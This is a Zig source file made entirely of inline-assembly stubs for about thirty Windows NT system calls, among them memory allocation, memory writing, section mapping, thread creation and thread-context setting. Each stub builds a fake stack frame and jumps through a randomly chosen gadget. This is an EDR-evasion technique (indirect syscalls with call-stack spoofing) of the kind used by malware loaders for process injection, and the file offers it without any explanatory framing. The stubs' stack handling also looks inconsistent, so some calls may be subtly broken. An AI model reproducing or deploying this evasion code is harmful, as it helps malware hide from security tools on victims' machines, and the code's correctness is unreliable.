comptime {
    asm (
        \\.global NtAllocateVirtualMemory_stub
        \\NtAllocateVirtualMemory_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtAllocateVirtualMemory(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtProtectVirtualMemory_stub
        \\NtProtectVirtualMemory_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtProtectVirtualMemory(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    xchgq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtFreeVirtualMemory_stub
        \\NtFreeVirtualMemory_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtFreeVirtualMemory(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    pushq %rcx
        \\    popq %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtWriteVirtualMemory_stub
        \\NtWriteVirtualMemory_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtWriteVirtualMemory(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtClose_stub
        \\NtClose_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtClose(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    xchgq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtOpenFile_stub
        \\NtOpenFile_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtOpenFile(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    pushq %rcx
        \\    popq %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtReadVirtualMemory_stub
        \\NtReadVirtualMemory_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtReadVirtualMemory(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtCreateSection_stub
        \\NtCreateSection_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtCreateSection(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    xchgq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtMapViewOfSection_stub
        \\NtMapViewOfSection_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtMapViewOfSection(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    pushq %rcx
        \\    popq %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtQueryInformationProcess_stub
        \\NtQueryInformationProcess_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtQueryInformationProcess(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtCreateFile_stub
        \\NtCreateFile_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtCreateFile(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    xchgq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtWriteFile_stub
        \\NtWriteFile_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtWriteFile(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    pushq %rcx
        \\    popq %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtQuerySystemInformation_stub
        \\NtQuerySystemInformation_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtQuerySystemInformation(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtDelayExecution_stub
        \\NtDelayExecution_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtDelayExecution(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtCreateEvent_stub
        \\NtCreateEvent_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtCreateEvent(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtWaitForSingleObject_stub
        \\NtWaitForSingleObject_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtWaitForSingleObject(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtOpenKey_stub
        \\NtOpenKey_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtOpenKey(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtQueryValueKey_stub
        \\NtQueryValueKey_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtQueryValueKey(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtSetInformationProcess_stub
        \\NtSetInformationProcess_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtSetInformationProcess(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtUserGetSystemMetrics_stub
        \\NtUserGetSystemMetrics_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtUserGetSystemMetrics(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtGetContextThread_stub
        \\NtGetContextThread_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtGetContextThread(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    xchgq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtSetContextThread_stub
        \\NtSetContextThread_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtSetContextThread(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    xchgq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtOpenSection_stub
        \\NtOpenSection_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtOpenSection(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtUnmapViewOfSection_stub
        \\NtUnmapViewOfSection_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtUnmapViewOfSection(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtCreateThreadEx_stub
        \\NtCreateThreadEx_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtCreateThreadEx(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtOpenProcess_stub
        \\NtOpenProcess_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtOpenProcess(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtResumeThread_stub
        \\NtResumeThread_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtResumeThread(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtSuspendThread_stub
        \\NtSuspendThread_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtSuspendThread(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtDeleteFile_stub
        \\NtDeleteFile_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtDeleteFile(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtSetInformationFile_stub
        \\NtSetInformationFile_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtSetInformationFile(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
        \\.global NtFlushInstructionCache_stub
        \\NtFlushInstructionCache_stub:
        \\    pushq %rbp
        \\    movq %rsp, %rbp
        \\    subq $0x30, %rsp
        \\    pushq fake_frame_buffer+24(%rip)
        \\    pushq fake_frame_buffer+16(%rip)
        \\    pushq fake_frame_buffer+8(%rip)
        \\    pushq fake_frame_buffer+0(%rip)
        \\    mov ssn_NtFlushInstructionCache(%rip), %eax
        \\    pushq %rax
        \\    pushq %rdx
        \\    movq %rcx, %r10
        \\    leaq gadget_pool(%rip), %r11
        \\    rdtsc
        \\    andq $63, %rax
        \\    movq (%r11, %rax, 8), %r11
        \\    popq %rdx
        \\    popq %rax
        \\    callq *%r11
        \\    movq %rbp, %rsp
        \\    popq %rbp
        \\    ret
    );
}
